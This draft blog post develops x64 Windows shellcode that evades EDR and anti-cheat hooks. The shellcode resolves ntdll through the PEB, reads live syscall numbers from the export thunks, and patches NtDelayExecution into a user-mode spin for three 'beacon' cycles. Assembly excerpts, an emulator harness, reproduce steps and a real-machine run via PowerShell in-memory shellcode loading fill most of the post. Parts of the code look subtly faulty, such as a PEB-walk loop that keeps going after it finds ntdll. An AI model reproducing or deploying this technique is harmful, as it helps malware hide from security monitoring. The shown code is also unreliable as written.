---
title: Sleep-masking a direct syscall
description: PIC x64 shellcode that walks the PEB, reads its syscall numbers out of the ntdll thunks, then rewrites NtDelayExecution into a userspace spin — three masked 250 ms cycles, six RWX syscalls, zero NtDelay.
publishedAt: 2026-09-03
updatedAt: null
draft: true
tags: [reverse-engineering, malware, assembly, windows]
cover: null
artifacts: []
---

The number is in the thunk. On a current x64 `ntdll.dll`, `NtDelayExecution` is a 31-byte sequence, and the syscall number is buried three bytes in, behind a preamble the classic extraction recipes never had to look at:

```
4C 8B D1                 mov r10, rcx
B8 3D 00 00 00           mov eax, 0x3D        ; <- the number, at offset +3
F6 04 25 08 03 FE 7F 01  test byte [0x7FFE0308], 1
75 03                     jne +3
0F 05                     syscall
CC CC CC ...             int3 pad
```

Every "read the syscall number out of the thunk" trick I'd seen anchored on the trap: find `0F 05`, walk back five, grab the `B8` and its `imm32`. On the legacy eight-byte thunk (`B8 <nr> 0F 05 C3`) that's the whole function. It is *not* this one — five bytes back from the `syscall` here is the top of the `test`'s immediate, not a `B8`. So the extractor has to be layout-agnostic: scan the leading bytes for the number-mov in whichever of the two encodings `ntdll` actually emits, and let the first match win. `NtDelayExecution` yields `0x3D`, `NtProtectVirtualMemory` yields `0x2B`. Both read, neither hardcoded.

That read — not the table, not the build number, not the `syscalls.h` you regenerate every time Microsoft ships a feature update — is the load-bearing idea of this post. Everything else, the PEB walk, the PE export parse, the RWX dance, is scaffolding to get you standing next to that thunk and able to rewrite it.

## The byte you can't afford to hard-code

Direct syscalls are the baseline now. The `syscall` (0F 05) instruction pops straight into the kernel via the `LSTAR`/`STAR`/`SFMASK` MSRs with the syscall number in `EAX`; modern EDRs and anti-cheat hook exactly that boundary, so "just call the import" stopped working as an evasion a long time ago. The tooling that survived is the [SysScape](https://github.com/alex1797/SysScape) / [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) line: resolve the number, emit the trap yourself.

But the number is the problem. Syscall numbers are assigned per build. The community answer is a table — [ikermit/11Syscalls](https://github.com/ikermit/11Syscalls), [hfiref0x/SyscallTables](https://github.com/hfiref0x/SyscallTables) — which is a maintenance treadmill: every Windows feature update reshuffles the mapping and your `syscalls.h` goes stale. There is a way to never hold the table at all, and it falls out of how `ntdll` lays out its exports. Every `Nt*`/`Zw*` export that is a real system call is a tiny thunk that moves the number into `EAX` and then traps. Scan a few bytes of the *real, mapped* function and the number is right there. No table, no version string, no "regenerate for 22H2".

The scanner, written to survive both thunk shapes:

```
; sysnr_from: rsi = function -> eax = nr (32-bit)
;   forward-scan offsets 0..23 for the first nr-mov:
;     B8 <nr:4>       mov eax,nr   — legacy + modern ntdll thunks
;     48 C7 C0 <nr:4> mov rax,nr   — the alternate encoder
;   the modern thunk is 4C 8B D1 B8 <nr:4> ..., so the B8 sits at +3,
;   behind the `mov r10, rcx` preamble. First match wins.
sysnr_from:
    xor r10, r10
.snr_scan:
    cmp byte [rsi + r10], 0x48
    je  .snr_rax
    cmp byte [rsi + r10], 0xB8
    je  .snr_eax
.snr_adv:
    inc r10
    cmp r10, 24
    jb  .snr_scan
    xor eax, eax
    ret
.snr_rax:
    cmp byte [rsi + r10 + 1], 0xC7
    jne .snr_adv
    cmp byte [rsi + r10 + 2], 0xC0
    jne .snr_adv
    mov eax, [rsi + r10 + 3]
    ret
.snr_eax:
    mov eax, [rsi + r10 + 1]
    ret
```

It's an interleaved scan, not an anchored one: at each of the 24 leading bytes, is this the start of a `mov eax, nr` (`B8`) or a `mov rax, nr` (`48 C7 C0`)? If so, the `imm32` right after it is the number. There's no `0F 05` anchor at all, which is exactly why it survives the modern thunk — the `B8` at offset 3 is found on its own, no `syscall` needed. The anchored version (find `0F 05`, look back five for `B8`) is what breaks on `4C 8B D1 B8 ... F6 ... 0F 05`: five bytes back from the trap is `FE`, the tail of the `test`'s immediate, so it walks off the end and returns 0. First-match-wins also keeps the two encodings from colliding. `NtDelayExecution` yields `0x3D`, `NtProtectVirtualMemory` yields `0x2B`.

## Resolving everything from the PEB

To get to those thunks with zero imports, the shellcode needs `ntdll.dll`'s base address, and it needs nothing but the process's own `PEB`. The walk is short:

```
; PEB -> Ldr -> InLoadOrder list -> the module whose name is ntdll.dll
mov rax, [gs:0x60]            ; rax = PEB
mov rax, [rax + 0x18]         ; rax = PEB->Ldr (PEB_LDR_DATA)
lea r14, [rax + 0x10]         ; r14 = &head of InLoadOrderModuleList
mov r13, [r14]                ; r13 = first entry (== head for a 1-node list)
.peb_walk:
    mov rsi, [r13 + 0x60]     ; BaseDllName.Buffer (UTF-16)
    movzx rdx, word [r13 + 0x58] ; BaseDllName.Length (bytes)
    shr rdx, 1                ; -> char count
    lea r8, [r12 + (s_ntdll_u16 - sym_base)]
    mov r9, 9                 ; len("ntdll.dll")
    call cmp_u16_ci
    test rax, rax
    jz  .peb_next
    mov rax, [r13 + 0x30]     ; DllBase — that's our ntdll
    jmp .peb_next
.peb_next:
    mov r13, [r13]            ; Flink — advance
    cmp r13, r14
    je  .peb_got
    jmp .peb_walk
```

The offsets that matter, all fixed in the x64 `LDR_DATA_TABLE_ENTRY` / `PEB_LDR_DATA` layout:

| field | offset | note |
|---|---|---|
| `PEB` (via GS) | `gs:0x60` | process env block |
| `PEB->Ldr` | `+0x18` | `PEB_LDR_DATA*` |
| `InLoadOrderModuleList` (head) | `Ldr+0x10` | `LIST_ENTRY`, circular |
| `entry.Flink` (walk pointer) | `+0x00` | next node |
| `entry.BaseDllName.Length` | `+0x58` | bytes; `>>1` = chars |
| `entry.BaseDllName.Buffer` | `+0x60` | UTF-16LE |
| `entry.DllBase` | `+0x30` | module image base |

These are layout assumptions, not a contract — the spacing of `LDR_DATA_TABLE_ENTRY` is a build detail. If the walk hits a shifted build it just fails to find the name and bails with `done_flag == 0`, which is the safe failure.

Once you have the image base, the PE is a two-hop read: `e_lfanew` at `+0x3C` points at the `PE\0\0` signature, the optional header starts `0x18` bytes later, and `DataDirectory[0]` sits at `OPT+0x70`. That `RVA` is the `IMAGE_EXPORT_DIRECTORY`. From there:

```
mov r10d, [r11 + 0x18]        ; NumberOfNames
mov r9d,  [r11 + 0x1C]        ; AddressOfFunctions   -> EAT
mov r9d,  [r11 + 0x20]        ; AddressOfNames       -> ENT
mov r9d,  [r11 + 0x24]        ; AddressOfNameOrdinals-> ORD
```

Each is a relative `RVA`, so `base + rva` gives you the real pointer. These are the documented `IMAGE_EXPORT_DIRECTORY` field offsets — no trickery. Resolution by name is then plain: walk the `ENT` (name table), ASCII-compare each NUL-terminated string against the target, take the matching ordinal from `ORD`, index the `EAT`, add the base. No hashing, no lookup table — a plain string compare against three names. `find_export` returns `0` on a miss and the shellcode treats that as "not found, bail".

## The mask

Now you have `NtDelayExecution`'s address and you know it's RWX-protected in the usual sense — you can read and execute it, not write it. You're about to overwrite its first twelve bytes with a jump, so you flip the page to writable first. That's the only reason `NtProtectVirtualMemory` is in the picture at all.

```
; save the 12 bytes we're about to clobber (r10 = NtDelayExecution)
mov rax, [r10]                ; first 8 bytes
mov [saved_bytes], rax
mov eax, [r10 + 8]            ; next 4 bytes
mov [saved_bytes + 8], eax
; patch over the first 12 bytes: 48 B8 <stub 8B> FF E0 = mov rax,<stub>; jmp rax
mov byte [r9], 0x48
mov byte [r9 + 1], 0xB8
lea  rax, [r12 + (.stub - sym_base)]
mov  [r9 + 2], rax
mov byte [r9 + 10], 0xFF
mov byte [r9 + 11], 0xE0
```

`48 B8 <imm64> FF E0` is `mov rax, <stub>; jmp rax` — a twelve-byte absolute jump that fits exactly over the original thunk's first twelve bytes. When we then `call [NtDelayExecution]`, execution lands on that `jmp` and falls into `.stub`, which does the waiting *in user space*:

```
.stub:
    ; absolute-load idiom: `mov eax,imm32` zero-extends into rax, then [rax].
    ; NOT `mov rax,[0x7FFE0014]` — nasm emits a redundant-SIB form
    ; (48 8B 04 25 ...) real Intel/AMD HW mis-decodes. KUSER_SHARED_DATA is
    ; mapped read-only at 0x7FFE0000 in every x64 process; SystemTime
    ; (100 ns since 1601) is the qword at +0x14.
    mov eax, 0x7FFE0014
    mov rax, [rax]
    mov [data_t0], rax
.st_wait:
    mov eax, 0x7FFE0014
    mov rax, [rax]
    sub rax, [data_t0]
    cmp rax, [timeout_val]
    jae .st_done
    jmp .st_wait
.st_done:
    mov r8, [saved_bytes]     ; first 8 saved bytes — a VALUE, not a pointer
    mov r9, [saved_ntdelay]
    mov [r9], r8              ; restore by writing the value directly
    mov eax, [saved_bytes + 8]
    mov [r9 + 8], eax
    ret
```

The stub reads its clock straight from `KUSER_SHARED_DATA`, not via any export. That page is mapped at `0x7FFE0000` in every x64 Windows process, read-only, and its `SystemTime` qword at `+0x14` is the same 100-ns-since-1601 value `KeQuerySystemTime` would hand back — already sitting in the user-mode mirror, no call required. So the mask has zero clock dependency: no export to resolve, no syscall to trap, just a page read in a tight loop. It polls until the timeout elapses, writes the twelve saved bytes back, and `ret`s. The original thunk is byte-for-byte restored; the `syscall` `NtDelayExecution` was *supposed* to issue never fires, because we jumped over it. The "sleep" is a user-mode spin on a shared clock.

One honest caveat: `SystemTime` is wall-clock, not monotonic — it steps forward on NTP sync or DST. For a 250 ms mask that's irrelevant; for a correctness-critical timer you'd want `InterruptTime` or the QPC. The point is to burn the timeout with the `NtDelayExecution` trap suppressed, not to be a reference clock.

There's one sharp edge in `.st_done` worth naming, because it's the kind of bug that only shows up when you actually run the bytes. The saved prologue is stored as a *value* in `saved_bytes`. A first draft did `mov rax, [r8]` after loading `r8` with that value — treating the saved bytes as a pointer and dereferencing eight bytes of `4C 8B D1 B8 ...` as an address. Unicorn faults on it with `UC_ERR_READ_UNMAPPED` and you spend a session wondering why a restore touches a page that was never mapped. The fix is to stop dereferencing: `mov [r9], r8` writes the value directly, and the high dword is loaded straight from `saved_bytes + 8`. One less indirection, and the trap is gone.

## Three beats, not one

The deployable does not fire once and go quiet. The data section opens with `beacon_cycles: dq 3`, and the step-5 entry point — the `NtProtectVirtualMemory` call that flips the thunk's page RWX — is the top of the loop. After the stub restores the thunk and the second `NtProtect` returns, the blob decrements the counter and jumps back while it is non-zero:

```
; loop tail, after the restore NtProtectVirtualMemory returns
mov rax, [r12 + (beacon_cycles - sym_base)]
dec rax
mov [r12 + (beacon_cycles - sym_base)], rax
jnz .beacon_top
```

So the main-path trace is three cycles × (RWX in, restore out) = **six `NtProtectVirtualMemory` syscalls**, and the shared clock advances 3 × 250 ms. The fallback path never reaches the loop tail: if the first `NtProtect` fails it takes the direct `NtDelayExecution` and leaves `beacon_cycles` at 3, which is itself the forensic signature of the fallback.

## The harness

The shellcode is position-independent and import-free, so it runs in [Unicorn](https://github.com/unicorn-engine/unicorn) against a hand-built Windows: a `PEB` → `Ldr` → entry chain, a minimal fake `ntdll` PE, and the `KUSER_SHARED_DATA` page mapped at its real address. The fake `ntdll` exports three thunks, all in the modern 31-byte layout — which is the whole point, because the extractor has to cope with the real shape:

```
NtDelayExecution        -> 4C 8B D1 B8 3D 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 CC ...
NtProtectVirtualMemory  -> 4C 8B D1 B8 2B 00 00 00 F6 04 25 08 03 FE 7F 01 75 03 0F 05 CC ...
KeQuerySystemTime       -> 48 B8 <&SYS_TIME> C3        ; dummy export, never resolved
```

Two hooks do the emulating. A CODE hook traps `0F 05` and emulates the *kernel side* of the trap the way `nt!KiSystemCall64` reads the arguments: `arg0 = R10` (not `RCX` — the `syscall` instruction overwrites `RCX` with the old `RIP` before the kernel ever sees it), `arg1 = RDX`, `arg2 = R8`, `arg3 = R9`, `arg4 = [RSP+0x28]` — and it requires `RSP ≡ 8 (mod 16)`: the kernel builds its frame off `[RSP]` and the 32 shadow bytes, and only that residue keeps the kernel's own frame 16-byte aligned. For `NtProtectVirtualMemory` (`0x2B`) it checks the process handle is `-1` (current-process pseudo-handle), that all three data pointers are inside the blob, writes the current protection back as `*OldProtect`, and applies `NewProtect` to a shadow copy of the page protection, so the "restore" call has something real to restore. It records the syscall number, zeroes `RAX` (STATUS_SUCCESS), and steps RIP past the instruction — so the trace is ground truth for which syscalls the blob actually issued. The clock is faked the honest way: a MEM_READ hook on the KUSER clock qword (`0x7FFE0014`) advances it by `TICK` (10 ms) on every 8-byte read, so the stub's tight poll loop sees time pass exactly as it would polling a live CPU. `gs:0x60` is faked by zeroing the GS base and writing the PEB pointer at `[0x60]`.

And the harness does not assume how the blob was entered. A real `call` leaves `RSP ≡ 8 (mod 16)` at entry, but a `jmp` — or an injector that copies the bytes into RWX and jumps at whatever frame it left — can land at any of the four 8-byte classes. So it runs the blob at **all four entry classes**, `RSP % 16 ∈ {0, 4, 8, 12}`, and each one must pass. The blob earns that: before each direct `syscall` it does `mov r13, rsp` / `and rsp, -16` / `sub rsp, 8` — rounding RSP *down* to the next 16-byte boundary, then dropping eight so the trap runs at `RSP ≡ 8` — and it aligns the same way around the masked `NtDelayExecution` `call rax`, restoring the caller's RSP before returning. Nothing about the caller's frame survives contact with the kernel.

The interesting output is that the syscall trace is exactly six entries, all `0x2B` — three masked cycles, no `NtDelayExecution`:

```
$ bash build.sh
assembled build/sleepmask.bin (1376 bytes)

$ micromamba run -n mdev python tests/run_harness.py
blob size:   1376 bytes
mode:        main (masked NtProtect)
--- entry RSP0=0x610000 (rsp % 16 = 0) ---
syscalls:    0x2B 0x2B 0x2B 0x2B 0x2B 0x2B
prot calls:  0x40 0x20 0x40 0x20 0x40 0x20
final prot:  0x20 (0x20 = original PAGE_EXECUTE_READ)
done_flag:   1 (at blob offset 1294 / 0x50E)
beacon_cycles: 0 (at blob offset 1150 / 0x47E)
sys_time:    7800000 (100ns units; timeout 2500000 = 250 ms)
ntdelay[12]: 4c 8b d1 b8 3d 00 00 00 f6 04 25 08
PASS
```

The identical block repeats for `rsp % 16 = 4`, `8`, and `12` — the full four-class run is [media/harness-output.txt](media/harness-output.txt).

Read that as: **six `NtProtectVirtualMemory` syscalls (three cycles of RWX in, restore out), zero `NtDelayExecution` syscalls, and 78 reads of the KUSER page** — per cycle, a 10 ms seed plus 25 poll steps; the clock ends at 780 ms with the third stub poll crossing the 250 ms timeout. The original 12 bytes of the thunk are restored byte-for-byte (`4c 8b d1 b8 3d 00 00 00 f6 04 25 08`, the first twelve bytes of the modern thunk), and `done_flag` is set. A sleep that cost no sleep syscall.

The blob itself is 1376 bytes. The entry is at offset `0x0`; the `call sym_base` / `pop r12` idiom at `0x0c`–`0x12` fixes the base (`r12` = image base + `0x11`), so every data reference is a constant displacement from `r12` and the image can be mapped anywhere. `done_flag` sits 82 bytes from the tail, at `0x50E`; `beacon_cycles` sits 226 bytes from the tail, at `0x47E`. Full disassembly and hex dumps are in [`media/`](media/).

## On real hardware

The harness is a model. The model can lie. So the payload gets run on a real x64 Windows 11 box, in-process, via PowerShell's `Add-Type` shellcode path (no disk image loaded — the SAC-proof mechanism). The full transcript is [media/real-windows-output.txt](media/real-windows-output.txt); it is from the preceding single-cycle 1333-byte build, while the current 3-cycle pre-call aligned blob is 1376 bytes. The forensic readback from the walk's own data section:

```
[powershell] sleepmask done_flag = 1  -> masked NtDelayExecution, slept, restored the original bytes
[powershell] forensic readback (field = value):
  ntdll_base      = 00007FFFC6540000   (PEB walk resolved ntdll)
  data_nr_delay   = 0000000000000034   (NtDelayExecution nr, from export prologue)
  data_nr_protect = 0000000000000050   (NtProtectVirtualMemory nr)
  saved_ntdelay   = 00007FFFC66A09F0   (original NtDelayExecution bytes @)
  saved_ntprotect = 00007FFFC66A0D70   (original NtProtectVirtualMemory bytes @)
  saved_old_prot  = 0000000000000040   (original protection)
  data_t0         = 01DD412C049781C8   (stub clock snapshot, 100ns since 1601)
  delay_status    = 0000000000000000   (NTSTATUS)
  prot_status     = 0000000000000000   (NTSTATUS)
  saved_bytes     = 4C 8B D1 B8 34 00 00 00 F6 04 25 08   (the 12 original thunk bytes)
```

Every field is populated. The PEB walk found ntdll at its real ASLR'd base. The export prologue scan read the *live* syscall numbers — `0x34` (52) for NtDelayExecution, `0x50` (80) for NtProtectVirtualMemory — which differ from the harness's `0x3D`/`0x2B`, confirming the numbers are read at runtime, not baked in. The thunk's first twelve bytes (`4C 8B D1 B8 34 00 00 00 F6 04 25 08` — `mov r10,rcx; mov eax,0x34; test ...`) were saved, patched, the stub spun on the KUSER clock for 250 ms, the bytes were restored, and `done_flag` is 1. Both syscalls returned `STATUS_SUCCESS`.

Two details worth noting. First, `saved_old_prot = 0x40` (PAGE_EXECUTE_READWRITE), not the expected `0x20` (PAGE_EXECUTE_READ) — this particular ntdll image's text pages were already RWX, so the NtProtectVirtualMemory flip was effectively a no-op. The code handles both cases identically: it saves whatever the kernel reports and restores it on the way out. Second, the stub's clock snapshot (`data_t0 = 0x01DD412C049781C8`) is a real 100-ns-since-1601 timestamp, not a zero or a harness seed — the KUSER page was read from the actual shared mapping.

## What this proves, and what it doesn't

It proves the per-cycle mechanism on two substrates: the Unicorn harness (four entry RSP classes, emulated kernel, current 3-cycle blob) and a real x64 Windows 11 process (live ntdll, live ASLR, live syscall numbers, real KUSER clock, single-cycle predecessor). The loop multiplier is a counter and a `jnz`; it does not change what each cycle does. A PIC, import-free x64 blob can locate `ntdll`, read its own syscall numbers out of the thunks, flip a page RWX, graft a user-mode spin over a syscall, and restore everything cleanly — on hardware, not just a model. The "mask" — turning a kernel wait into a userspace one — is the part that's actually worth doing, because the syscall boundary is exactly where the observer is standing.

It does *not* prove the wait is invisible to a hypervisor, and it does not prove KUSER's `SystemTime` is safe to treat as monotonic — it's wall-clock, and it steps on NTP/DST. The honest claim: the *`NtDelayExecution` trap* is what's gone, replaced by polling a page that's already mapped in every process. The number-reading is the durable part — it's the one piece that doesn't rot when Microsoft ships a new `ntdll`.

## Reproduce

```
bash build.sh
micromamba run -n mdev python tests/run_harness.py
```

Expect the `PASS` block above: `syscalls: 0x2B 0x2B 0x2B 0x2B 0x2B 0x2B`, `beacon_cycles: 0`, `sys_time: 7800000`, `ntdelay[12]` restored, `done_flag: 1`.

## Sources

- [SysScape — syscall numbers by name, no tables](https://github.com/alex1797/SysScape)
- [SysWhispers2 — direct system calls, sorted-by-address technique](https://github.com/jthuraisamy/SysWhispers2)
- [ikermit/11Syscalls — extracting the number from the `B8 ... 0F 05` thunk](https://github.com/ikermit/11Syscalls)
- [hfiref0x/SyscallTables — NT10/11 syscall tables](https://github.com/hfiref0x/SyscallTables)
- [Direct system calls — 0xbekoo notes](https://0xbekoo.github.io/docs/malware-dev/direct-syscalls/)
- [KUSER_SHARED_DATA — nt doc](https://ntdoc.m417z.com/kuser_shared_data)
- [KUSER_SHARED_DATA — Microsoft NTDDK reference](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data)
- [Getting OS information: the KUSER_SHARED_DATA structure — OSM](https://osm.hpi.de/wrk/2007/08/getting-os-information-the-kuser_shared_data-structure/)
- [IMAGE_EXPORT_DIRECTORY — Microsoft docs](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image-export-directory)
- [PE file format — Microsoft docs](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Unicorn Engine](https://github.com/unicorn-engine/unicorn)
- [Capstone Engine](https://github.com/capstone-engine/capstone)
- [NASM](https://nasm.sourceforge.io/)
